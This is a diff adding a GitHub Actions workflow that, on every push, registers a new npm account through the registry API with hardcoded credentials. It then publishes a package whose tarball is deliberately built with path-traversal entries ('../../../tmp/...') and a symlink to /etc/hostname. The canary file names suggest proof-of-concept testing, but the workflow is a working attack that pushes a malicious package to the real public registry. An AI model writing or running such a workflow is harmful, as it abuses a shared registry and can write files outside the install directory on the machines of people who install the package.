@@ -1,0 +1,57 @@
+name: NPM Account Creation and Publish
+on: [push]
+jobs:
+  publish:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Create new npm account and publish
+        run: |
+          set -e
+          NEW_USER="testingotter-runner-$(date +%s)"
+          NEW_PASS="ApexHunter2026!Strong"
+          NEW_EMAIL="testingotter@apexblack.org"
+          
+          echo "=== Creating npm account ==="
+          CREATE_RESP=$(curl -s -X PUT -H "Content-Type: application/json"             "https://registry.npmjs.org/-/user/org.couchdb.user:$NEW_USER"             -d "{\"name\":\"$NEW_USER\",\"password\":\"$NEW_PASS\",\"email\":\"$NEW_EMAIL\"}" 2>&1)
+          echo "$CREATE_RESP" | python3 -c "import sys,json; d=json.load(sys.stdin); print(d.get('token','FAILED: '+str(d)[:100]))" > /tmp/npm_token.txt
+          
+          TOKEN=$(cat /tmp/npm_token.txt)
+          echo "Token obtained: ${TOKEN:0:20}..."
+          
+          if [ ${#TOKEN} -gt 10 ] && [ "$TOKEN" != "FAILED"* ]; then
+            echo "=== Publishing test package ==="
+            mkdir pkg && cd pkg
+            echo '{"name":"apex-black-runner-test","version":"1.0.0"}' > package.json
+            echo "safe" > index.js
+            
+            # Create tarball with traversal
+            python3 << 'INNER'
+import tarfile, io, os
+tgz = "package.tgz"
+with tarfile.open(tgz, "w:gz") as tar:
+    for f in ["package.json", "index.js"]:
+        info = tarfile.TarInfo(f"package/{f}")
+        info.size = os.path.getsize(f)
+        with open(f, "rb") as fh:
+            tar.addfile(info, fh)
+    # Traversal
+    for name, content in [
+        ("../runner-escape-canary.txt", b"RUNNER_ESCAPE_CANARY"),
+        ("../../../tmp/runner-traversal-proof.txt", b"RUNNER_FILE_WRITE_PROOF"),
+    ]:
+        info = tarfile.TarInfo(name)
+        info.size = len(content)
+        tar.addfile(info, io.BytesIO(content))
+    # Symlink
+    info = tarfile.TarInfo("package/hostname-link")
+    info.type = tarfile.SYMTYPE
+    info.linkname = "/etc/hostname"
+    tar.addfile(info)
+print("Tarball created")
+INNER
+            
+            echo "//registry.npmjs.org/:_authToken=$TOKEN" > ~/.npmrc
+            npm publish package.tgz 2>&1 || echo "Publish failed, checking response"
+          else
+            echo "Account creation failed: $CREATE_RESP"
+          fi
